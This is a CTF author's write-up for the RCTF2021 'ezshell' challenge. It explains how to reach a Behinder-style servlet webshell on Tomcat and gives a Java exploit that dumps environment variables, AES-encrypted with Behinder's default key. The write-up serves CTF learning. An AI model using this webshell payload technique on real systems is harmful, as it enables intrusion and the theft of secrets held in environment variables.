---
title: RCTF2021_misc_ezshell_出题人wp
categories: CTF
comments: true
photos: https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png
---

docker

https://github.com/pipimi110/myctf/tree/main/misc/rctf2021_ezshell

## 预期解

http://124.70.137.88:60080/xxx tomcat 404报错

/index.html 跳转 /shell 可以直接下载 ROOT.war

发现有个根据冰蝎 shell.jsp 实现的 servlet shell，根据题目描述，过滤了内存马、命令执行，且限制出网，所以考虑实现回显

根据提示，查看冰蝎 BasicInfo 源码，发现其功能为输出环境变量和系统属性，Exp 尝试直接输出环境变量就看到 flag 了

**补充**

其实这道题主要方向是冰蝎密钥交互写死 getOutputStream 和题目 Servlet 里的 getWriter 冲突

如果有的师傅手上有修改后支持连接内存马的冰蝎，修改对应函数名为 Servlet 中的 'e' 后，应该也是连不上的: )

payload/java/Echo

```
Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
```

支持内存马连接和函数冲突解决的冰蝎的一个demo

https://github.com/pipimi110/Behinder_ezshell

ezshell中使用的agent

https://github.com/pipimi110/javaAgentLearn

## Expected solution

http://124.70.137.88:60080/xxx tomcat 404  error

**/index.html** jump to **/shell** to download **ROOT.war**

found a servlet shell based on shell.jsp of the Behinder ,according to the desc, There is an agent to filter memshell and ProcessImpl, and The Outbound traffic is closed, so just Echo

According to the hint, read the source code of the Behinder BasicInfo, and find that its function is to output environment variables and system properties, then try to directly output environment variables and see flag :)

**Additions**

In fact, the main direction of this question is the conflict between the **getOutputStream** used in the Behinder key interaction  and the **getWriter** in the Servlet

If some ctfers have a modified Behinder that supports connecting to memshell, they should not be able to connect even after modifying the corresponding function name to 'e' in the Servlet: )

payload/java/Echo

```
Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
```

A demo of Behinder that supports memshell connection and function conflict resolution

https://github.com/pipimi110/Behinder_ezshell

Agent used in ezshell

https://github.com/pipimi110/javaAgentLearn

## Exp

```
import javassist.ClassPool;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.*;

public class demo {
    public boolean e(Object obj1, Object obj2) {
        solve((HttpServletResponse) obj2);
        return false;
    }

    public void solve(HttpServletResponse obj2) {
        try {
            obj2.getWriter().write("demo success");
            obj2.getWriter().write(getSysEnv());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
//        getSysEnv();
        getpayload();
    }

    public static String getSysEnv() throws Exception {
        StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
        Map<String, String> env = System.getenv();
        Iterator var5 = env.keySet().iterator();

        while (var5.hasNext()) {
            String name = (String) var5.next();
            basicInfo.append(name + "=" + (String) env.get(name) + "<br/>");
        }
        return (basicInfo.toString());
    }

    public static void getpayload() throws Exception {
        String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        Cipher c = Cipher.getInstance("AES");
        c.init(1, new SecretKeySpec(k.getBytes(), "AES"));

        byte[] bytes = ClassPool.getDefault().get("demo").toBytecode();
        bytes = c.doFinal(bytes);
        System.out.println(new String(Base64.getEncoder().encode(bytes)));
    }

}

class U extends ClassLoader {
    U(ClassLoader c) {
        super(c);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }
}
```

